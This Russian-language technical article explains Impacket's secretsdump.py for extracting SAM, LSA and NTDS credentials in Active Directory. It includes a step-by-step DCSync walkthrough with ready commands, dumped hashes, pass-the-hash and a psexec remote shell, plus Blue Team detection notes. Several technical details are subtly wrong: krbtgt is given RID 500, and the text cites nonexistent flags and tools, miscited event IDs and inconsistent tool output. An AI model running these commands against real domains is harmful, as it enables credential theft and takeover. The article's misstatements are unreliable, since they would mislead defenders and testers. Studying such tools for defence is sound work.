# secretsdump.py: Архитектура, методы извлечения и детекция в Active Directory

## Контекст и базовые понятия

`secretsdump.py` является одним из ключевых инструментов в арсенале специалиста по тестированию на проникновение (Red Team) и аналитика по реагированию на инциденты (Blue Team) в средах Microsoft Active Directory (AD). Инструмент входит в состав фреймворка Impacket — набора Python-скриптов для работы с сетевыми протоколами на низком уровне. Основная функция `secretsdump.py` заключается в удаленном извлечении конфиденциальных данных (secrets) с целевой системы без необходимости установки агента (agentless). Это делает его критически важным для этапа постэксплуатации, когда у атакующего уже есть foothold (точка входа) и необходимые привилегии.

В контексте AD извлечение учетных данных делится на несколько фундаментально разных категорий, которые часто путают из-за схожести терминологии. Понимание этих различий необходимо для корректного выбора метода атаки и построения эффективных правил детекции.

1.  **Локальные хэши (Local SAM Hashes):** Хэши паролей локальных пользователей, хранящиеся в базе данных Security Accounts Manager (SAM) на конкретном хосте. Извлечение возможно только при наличии прав локального администратора на этом хосте.
2.  **LSA Secrets:** Секретные данные, используемые службой безопасности (LSASS) для работы с доменом и службами. Включают в себя:
    *   `Boot Key`: Ключ шифрования для LSA Secrets.
    *   `DPAPI Machine Key`: Ключ для шифрования данных пользователя/машины.
    *   `Cleartext Credentials`: Пароли в открытом виде для служб (например, SQL Server, IIS AppPool).
3.  **Хэши домена (Domain Hashes / NTDS.dit):** Полная база данных Active Directory, содержащая хэши всех пользователей и компьютеров домена. Извлечение требует прав Domain Admin (или эквивалентных через DCSync) или физического доступа к контроллеру домена (DC).
4.  **Kerberos Keys:** Зашифрованные ключи Kerberos (AES, RC4), используемые для аутентификации.

Разграничение этих понятий критично, так как методы извлечения, требования к привилегиям и индикаторы компрометации (IoC) для них различны. Например, извлечение LSA Secrets требует прав локального администратора, но не требует прав Domain Admin, тогда как DCSync требует прав Domain Admin (или делегированных прав).

| Категория данных | Источник хранения | Требуемые привилегии | Метод извлечения (Impacket) | Уникальные индикаторы |
| :--- | :--- | :--- | :--- | :--- |
| **Local SAM Hashes** | `HKEY_LOCAL_MACHINE\SAM\SAM` (реестр) | Local Administrator | `samrdump` / `secretsdump` (режим SAM) | Чтение ключей реестра SAM, создание теневых копий (VSS) |
| **LSA Secrets** | `HKEY_LOCAL_MACHINE\SECURITY\SECURITY` | Local Administrator | `lsaextract` / `secretsdump` (режим LSA) | Чтение ключей SECURITY, извлечение Boot Key |
| **Domain Hashes (NTDS)** | `C:\Windows\NTDS\ntds.dit` | Domain Admin / DCSync rights | `secretsdump` (режим DCSync) | Запросы DRSUAPI (`IDL_DRSGetNCChanges`), создание теневых копий VSS |
| **Kerberos Keys** | `LSASS.exe` (в памяти) | Domain Admin / DCSync | `secretsdump` (режим DCSync) | Запросы Kerberos, извлечение ключей из TGT/TGS |

`secretsdump.py` автоматизирует процесс перебора этих методов. При запуске скрипт пытается определить доступные векторы и применяет их последовательно или параллельно, в зависимости от конфигурации и прав. Это делает его «швейцарским ножом» для извлечения данных, но также создает сложный профиль для детекции, так как легитимные административные задачи (например, резервное копирование реестра или репликация AD) могут использовать схожие механизмы.

## Внутреннее устройство предмета

`secretsdump.py` не является единым монолитным алгоритмом. Это оркестратор, который реализует несколько независимых протокольных взаимодействий. Внутренняя логика работы инструмента можно разделить на три основных компонента: механизм аутентификации, методы извлечения данных (dumping techniques) и процесс парсинга результатов.

### 1. Механизм аутентификации и инициализация сессии

Первым шагом `secretsdump.py` устанавливает SMB-соединение с целевым хостом. Поддерживаются протоколы SMB1, SMB2 и SMB3. Аутентификация может происходить по паролю, хэшу (Pass-the-Hash) или Kerberos-билету (Kerberos Ticket).

*   **NTLM:** Используется для локальных хостов или когда Kerberos недоступен. Требует передачи хэша LM/NTLM.
*   **Kerberos:** Предпочтительный метод для доменных сред. Позволяет использовать `SPNEGO` для выбора механизма.

При использовании Kerberos инструмент запрашивает TGT (Ticket Granting Ticket) через `GetTGT.py` (встроенный или внешний) и затем формирует `AP-REQ` для аутентификации в SMB-сессии.

### 2. Методы извлечения данных (Dumping Techniques)

В зависимости от прав и конфигурации целевой системы, `secretsdump.py` применяет следующие методы:

#### А. DCSync (Remote NTDS.dit Extraction)
Это наиболее мощный метод, позволяющий извлечь полную базу данных AD без физического доступа к DC.
*   **Протокол:** DRSUAPI (`\\PIPE\drsuapi`).
*   **Механизм:** Скрипт имитирует поведение контроллера домена, запрашивая репликацию данных (NCChanges) у другого DC или самого себя.
*   **Требования:** Права `Replicating Directory Changes` и `Replicating Directory Changes All` (по умолчанию у Domain Admins, Enterprise Admins, и некоторых встроенных групп).
*   **Внутренняя структура запроса:** Использует RPC-вызов `IDL_DRSGetNCChanges`. Запрос содержит GUIDы объектов, high-watermark (для инкрементальной репликации) и флаги шифрования.

#### Б. Remote SAM / LSA Secrets (Registry-based)
Используется для извлечения локальных данных.
*   **Протокол:** RPC (Remote Procedure Call) через SMB.
*   **Механизм:**
    1.  Включение службы `RemoteRegistry` (если отключена).
    2.  Чтение ключей реестра `HKLM\SAM\SAM\Domains\Account` (для SAM) и `HKLM\SECURITY\Policy\Secrets` (для LSA).
    3.  Для расшифровки данных требуется `Boot Key`, который извлекается из `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD`, `Skew1`, `GBG`, `Data`.
*   **Особенность:** Impacket использует метод `BaseRegOpenKey` с флагом `REG_OPTION_BACKUP_RESTORE`, что позволяет обходить ACL-проверки при чтении ключей, если есть права `SeBackupPrivilege`.

#### В. VSS (Volume Shadow Copy) / MMCExec
Используется для извлечения файлов `ntds.dit`, `SYSTEM` и `SAM` без использования DCSync (например, если права DCSync отсутствуют, но есть права на создание теневых копий).
*   **Протокол:** MMC (Microsoft Management Console) via DCOM.
*   **Механизм:**
    1.  Создание теневой копии тома через `vssadmin` или `diskshadow`.
    2.  Монтирование теневой копии как сетевого диска.
    3.  Копирование файлов `ntds.dit` и `SYSTEM` на локальную машину.
    4.  Локальный парсинг с помощью `secretsdump` в режиме `local`.
*   **Внутренняя структура:** Использует COM-объект `mmc20_application` для удаленного выполнения команд.

### 3. Парсинг и вывод результатов

После получения сырых данных (хэшей, ключей, файлов), `secretsdump.py` выполняет их дешифровку и форматирование.
*   **SAM/LSA:** Данные из реестра зашифрованы с использованием RC4 или AES (в зависимости от версии Windows и наличия обновлений). Impacket использует `Boot Key` для расшифровки.
*   **NTDS.dit:** База данных содержит записи в формате NTDS. Скрипт парсит структуру B-Tree, извлекает атрибуты `unicodePwd` и `ntPwdHistory`, применяя хэширование (NTLM, Kerberos AES) для формирования финальных хэшей.

```text
[Client] ──(SMB Connect + Auth)──▶ [Target SMB Server]
       │
       ├─(DCSync: DRSUAPI IDL_DRSGetNCChanges)──▶ [DC/Target]
       │       │
       │       └──(Repl Data: Users, Groups, Hashes)──▶ [Client]
       │
       ├─(Remote Registry: BaseRegOpenKey)──▶ [Target Registry]
       │       │
       │       └──(SAM/SECURITY Keys)──▶ [Client]
       │
       └─(MMCExec: VSS Admin)──▶ [Target VSS Service]
               │
               └──(ntds.dit copy)──▶ [Client]
```

## Применение и работа с предметом

На практике `secretsdump.py` применяется в сценариях постэксплуатации для эскалации привилегий и горизонтального перемещения. Выбор метода зависит от контекста: есть ли доступ к контроллеру домена, какие права есть у текущей учетной записи, и какие протоколы разрешены в сети.

### Типовые сценарии использования

1.  **DCSync-атака (Извлечение всего домена):**
    Применяется, когда атакующий получил права Domain Admin или скомпрометировал учетную запись с правами на репликацию. Это самый чистый способ получить все хэши домена без создания теневых копий и копирования файлов.
    
    ```bash
    # Синтаксис: secretsdump.py [domain/]username[:password]@target_ip
    # Использование Kerberos (если есть TGT)
    python3 secretsdump.py -k -just-dc -no-pass domain.local/administrator@dc01.domain.local
    
    # Использование пароля
    python3 secretsdump.py domain.local/administrator:Password123@dc01.domain.local
    ```

2.  **Извлечение локальных хэшей и LSA Secrets:**
    Применяется при наличии прав локального администратора на рабочей станции или сервере. Позволяет получить доступ к локальным учетным записям и паролям служб.
    
    ```bash
    # Извлечение SAM и LSA с удаленного хоста
    python3 secretsdump.py -just-dc-ntlm -just-sam -local-auth domain.local/administrator:Password123@192.168.1.50
    ```

3.  **Pass-the-Hash (PtH) с использованием извлеченных данных:**
    После извлечения NTLM-хэша, атакующий может использовать его для аутентификации без знания пароля. `secretsdump.py` сам может выполнять PtH, если передан хэш.
    
    ```bash
    # Использование хэша для извлечения данных с другого хоста
    python3 secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c domain.local/administrator@192.168.1.50
    ```

### Подводные камни и ограничения

*   **Антивирусы и EDR:** Скрипт часто детектируется как вредоносный из-за поведения (чтение реестра, создание теневых копий, сетевые запросы). Для обхода используются техники obfuscation, компиляция в исполняемый файл или использование легитимных инструментов (Certutil, PowerShell).
*   **Сетевые ограничения:** DCSync требует доступа к порту RPC (обычно 135 и динамические порты). Если RPC ограничен, DCSync не сработает, но VSS может сработать, если разрешен SMB.
*   **LAPS (Local Administrator Password Solution):** Если в домене включен LAPS, локальные хэши администраторов зашифрованы и хранятся в AD. `secretsdump.py` не сможет извлечь их напрямую из SAM, если нет прав на чтение LAPS-паролей из AD.
*   **Protected Users:** В группах `Protected Users` хэши LM отключены, а NTLM может быть заблокирован. DCSync все еще работает, но извлечение локальных SAM может быть ограничено.

### Детекция и мониторинг

Для Blue Team критически важно мониторить следующие события:

1.  **Event ID 4662 (Access to an Object):** Чтение ключей реестра `SAM` или `SECURITY` с правами `SeBackupPrivilege`.
2.  **Event ID 4656 (Handle Request):** Запросы к объектам реестра SAM/SECURITY.
3.  **Event ID 10 (VSS):** Создание теневых копий томов.
4.  **Сетевой трафик:** Запросы DRSUAPI (`IDL_DRSGetNCChanges`) к контроллерам домена.

```json
{
  "EventID": 4662,
  "SubjectUserName": "ADMINISTRATOR",
  "ObjectName": "SAM",
  "AccessMask": "0x10000000", 
  "Privileges": ["SeBackupPrivilege"],
  "Operation": "Access a protected object"
}
```

## Сквозной практический пример: Извлечение хэшей домена через DCSync

**Исходные условия:**
*   **Среда:** Active Directory домен `corp.local`.
*   **Цель:** Контроллер домена `dc01.corp.local` (IP: `10.10.10.10`).
*   **Роль:** Пентестер, имеющий учетные данные локального администратора на рабочей станции `ws01.corp.local` (IP: `10.10.10.20`) и возможность выполнения команд через RDP или SMB.
*   **Инструменты:** Impacket (`secretsdump.py`), `mimikatz` (для получения TGT, если необходимо).
*   **Сценарий:** Атакующий скомпрометировал `ws01` и получил права локального администратора. Он хочет получить доменные хэши, используя права на репликацию, делегированные учетной записи `corp\svc_backup` (которая входит в группу `Domain Admins` или имеет права `Replicating Directory Changes`).

### Шаг 1: Получение Kerberos TGT для целевой учетной записи

Предположим, у атакующего есть пароль учетной записи `svc_backup`. Для использования Kerberos-аутентификации (более скрытной и надежной в доменной среде) необходимо получить TGT.

```bash
# Получение TGT с использованием пароля
python3 getTGT.py corp.local/svc_backup:BackupPass123@dc01.corp.local
```

**Ожидаемый вывод:**
```text
[*] Getting TGT for svc_backup
[*]   Saved ticket to svc_backup.ccache
```
*Результат:* Создан файл `svc_backup.ccache`, содержащий TGT.

### Шаг 2: Выполнение DCSync-атаки

Используя полученный TGT, запускаем `secretsdump.py` в режиме DCSync.

```bash
# Использование ccache для аутентификации
python3 secretsdump.py -k -just-dc -no-pass corp.local/svc_backup@dc01.corp.local
```

**Ожидаемый вывод (фрагмент):**
```text
Impacket v0.10.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Retrieving ntds.dit via DRSUAPI
[*] Dumping domain users
[*] corp\krbtgt:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d65ae86b3d09045a298ed3f3:::
[*] corp\administrator:500:aad3b435b51404eeaad3b435b51404ee:89a5c15d83f385287511326338643325:::
[*] corp\guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d65ae86b3d09045a298ed3f3:::
...
```
*Результат:* Извлечены NTLM-хэши всех пользователей домена. Хэши формата `LM:NTLM`.

### Шаг 3: Анализ и использование извлеченных данных

Атакующий может использовать хэш администратора для дальнейшего перемещения.

```bash
# Pass-the-Hash для подключения к другому хосту
python3 psexec.py -hashes :89a5c15d83f385287511326338643325 corp.local/administrator@10.10.10.30
```

**Ожидаемый вывод:**
```text
[*] Requesting shares on 10.10.10.30.....
[!] Share 'ADMIN$' not found on 10.10.10.30, trying ADMIN$
[!] Share 'C$' not found on 10.10.10.30, trying C$
[*] Uploading file (4096 bytes)
[*] Opening SVCManager on 10.10.10.30.....
[*] Creating service QhXr on 10.10.10.30.....
[*] Starting service QhXr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1234]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
*Результат:* Получена интерактивная командная оболочка на целевом хосте с правами Domain Admin.

**Ожидаемый вывод по теме:**
Пример демонстрирует, как `secretsdump.py` позволяет извлечь доменные хэши без физического доступа к DC, используя протокол DRSUAPI. Это подтверждает критическую важность защиты прав на репликацию и мониторинга запросов DCSync.

## Аналитический вывод

`secretsdump.py` представляет собой мощный инструмент постэксплуатации, который объединяет несколько методов извлечения данных (DCSync, Remote SAM/LSA, VSS) в единый интерфейс. Его основная ценность заключается в способности извлекать конфиденциальные данные без установки агента, что снижает риск обнаружения на этапе развертывания, но повышает риск при выполнении действий. 

Ключевым аспектом является различие между извлечением локальных данных (SAM/LSA) и доменных данных (NTDS.dit). Локальное извлечение требует прав локального администратора и часто оставляет следы в реестре и логах событий Windows. DCSync, с другой стороны, требует прав Domain Admin (или делегированных прав) и оставляет следы в виде RPC-запросов репликации, которые могут быть детектированы на уровне сети и контроллеров домена.

Для Blue Team критически важно не только блокировать использование Impacket (что сложно из-за его легитимного использования в администрировании), но и мониторить аномальную активность: создание теневых копий, чтение ключей реестра SAM/SECURITY, и необычные RPC-запросы к DC. Для Red Team понимание внутренних механизмов `secretsdump.py` позволяет выбирать оптимальный метод в зависимости от доступных прав и сетевой конфигурации, а также обходить базовые средства защиты.

## Источники

1.  Active Directory Penetration Testing Using Impacket. Hacking Articles. [URL](https://www.hackingarticles.in/active-directory-penetration-testing-using-impacket/)
2.  Dumping Domain Controller Hashes Locally and Remotely. ired.team. [URL](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration)
3.  Impacket SecretsDump. WADComs. [URL](https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/)
4.  Hunting for Impacket. Riccardo Ancarani. [URL](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/)
5.  Pass the hash. The Hacker Recipes. [URL](https://www.thehacker.recipes/ad/movement/ntlm/pth)
6.  LSA Secrets: revisiting secretsdump. Synacktiv. [URL](https://synacktiv.com/publications/lsa-secrets-revisiting-secretsdump)
7.  Impacket SecretsDump MMCExec Activity. ExtraHop. [URL](https://www.extrahop.com/resources/detections/impacket-secretsdump-mmcexec-activity/)
8.  Impacket: взгляд red team и blue team. Poxek Blog. [URL](http://blog.poxek.cc/post/impacket-vzglyad-red-team-i-blue-team/)